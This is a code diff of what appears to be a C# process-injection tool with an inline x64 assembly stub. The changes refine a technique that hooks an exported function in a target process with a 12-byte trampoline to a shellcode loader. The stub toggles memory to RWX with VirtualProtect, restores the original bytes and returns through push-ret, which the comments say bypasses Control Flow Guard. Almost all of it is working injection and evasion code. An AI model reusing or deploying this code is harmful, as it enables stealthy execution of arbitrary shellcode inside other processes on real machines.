@@ -83,64 +83,46 @@ internal static class Program
         MyStub PROC
 
             ; ==========================================
-            ; 1. PROLOG: Save registers
+            ; PROLOG: Save registers
             ; ==========================================
-            pop rax                 ; Get return address (hooked function)
-            sub rax, 0Ch            ; Get actual start of hooked function (+12 bytes)
-    
-            push rax                ; Save hooked function address
-            push rbx                ; Save hookedFunc as rbx
-            push rsi                ; Save VirtProt as rsi
-    
-            ; Save other volatile registers
-            push rcx
+            ; rbx already has the addr of the hooked function via ret
+            push rsi                ; Save old rsi
+            push rcx                ; Save all volatile registers
             push rdx
             push r8
             push r9
             push r10
             push r11
-        
-            ; ==========================================
-            ; 2. INITIALIZE: permanent registers once
-            ; ==========================================
-            pop rbp                        ; Temporary pop to grab the hookedFunc addr
-            mov rbx, rbp                   ; Store hookedFunc permanently in rbx
-            mov rsi, 0FFEEDDCCBBAA9988h    ; Store VirtProt permanently in rsi
 
             ; ==========================================
             ; VIRTUALPROTECT (Change to RWX)
             ; ==========================================
-            sub rsp, 20h            ; Allocate shadow space
-            sub rsp, 8              ; Extra 8 bytes for oldProtect scratch variable
-    
+            mov rsi, 0FFEEDDCCBBAA9988h    ; Store VirtProt in rsi (patched in runtime)
+            sub rsp, 28h            ; Allocate shadow space 20h + 8 for oldProtect
             mov rcx, rbx            ; Arg 1: hookedFunc
             mov rdx, 12             ; Arg 2: Size
             mov r8, 40h             ; Arg 3: PAGE_EXECUTE_READWRITE (0x40)
             lea r9, [rsp]           ; Arg 4: oldProtect pointer
             call rsi                ; Call VirtualProtect
-    
-            add rsp, 28h            ; Clean up stack (20h + 8h)
+            add rsp, 28h            ; Clean up stack 
 
             ; ==========================================
             ; RESTORE ORIGINAL 12 BYTES in hooked func
             ; ==========================================
-            mov rax, 1122334455667788h    ; First 8 bytes of original prologue
+            mov rax, 1122334455667788h    ; First 8 bytes of original prologue (patched in runtime)
             mov QWORD PTR [rbx], rax      ; Write bytes to [rbx]
-            mov ecx, 99AABBCCh            ; Next 4 bytes
-            mov DWORD PTR [rbx + 8], ecx  ; Write bytes to [rbx + 8]
+            mov eax, 99AABBCCh            ; Next 4 bytes of original prologue (patched in runtime)
+            mov DWORD PTR [rbx + 8], eax  ; Write bytes to [rbx + 8]
 
             ; ==========================================
             ; VIRTUALPROTECT (Change back to RX)
             ; ==========================================
-            sub rsp, 20h            ; Allocate shadow space
-            sub rsp, 8              ; Extra 8 bytes for oldProtect scratch variable
-    
+            sub rsp, 28h            ; Allocate shadow space 20h + 8 for oldProtect
             mov rcx, rbx            ; Arg 1: hookedFunc
             mov rdx, 12             ; Arg 2: Size
             mov r8, 20h             ; Arg 3: PAGE_EXECUTE_READ (0x20)
             lea r9, [rsp]           ; Arg 4: oldProtect pointer
             call rsi                ; Call VirtualProtect
-    
             add rsp, 28h            ; Clean up stack
 
             ; ==========================================
@@ -151,7 +133,7 @@ internal static class Program
             add rsp, 40h            ; Clean up stack
 
             ; ==========================================
-            ; EPILOG: Restore everything and exit
+            ; EPILOG: Restore and exit
             ; ==========================================
             pop r11
             pop r10
@@ -161,8 +143,8 @@ internal static class Program
             pop rcx
             pop rsi
 
-            push rbx                ; rbx still hold hookedFunc addr
-            ret                     ; use ret to bypass CFG
+            push rbx                ; rbx stills hold hookedFunc addr
+            ret                     ; use push-ret to bypass CFG
 
         MyStub ENDP
 
@@ -343,19 +325,19 @@ internal static class Program
 
         // overwrite with the new 12 bytes to call the loader stub
         var callOpCode = new byte[] {
-            0x48, 0xB8,                  // [Index 0-1]   movabs rax, XXXX
+            0x48, 0xBB,                  // [Index 0-1]   movabs rbx, XXXX
             0, 0, 0, 0, 0, 0, 0, 0,      // [Index 2-9]   full 8-bytes addressing (where the loader may be)
-            0x50,                        // [Index 10]    push rax
-            0xC3                         // [Index 11]    ret (call rax, i.e. the loader)
+            0x53,                        // [Index 10]    push rbx
+            0xC3                         // [Index 11]    ret (call rbx, i.e. the loader)
         };
         // Copy the 8-byte address to the shellcode loader into indices 2 through 9
         BitConverter.GetBytes(loaderAddress).CopyTo(callOpCode, 2);
 
-        // write the call to the loader stub
+        // write the hook (call) to the loader stub
         ProtectVirtualMemory(
             hProcess,
             exportAddress,
-            8,
+            (uint)callOpCode.Length,
             MemoryProtection.ExecuteReadWrite,
             out var oldProtectHook);
 
@@ -374,7 +356,7 @@ internal static class Program
         ProtectVirtualMemory(
             hProcess,
             exportAddress,
-            8,
+            (uint)callOpCode.Length,
             oldProtectHook,
             out _);
 
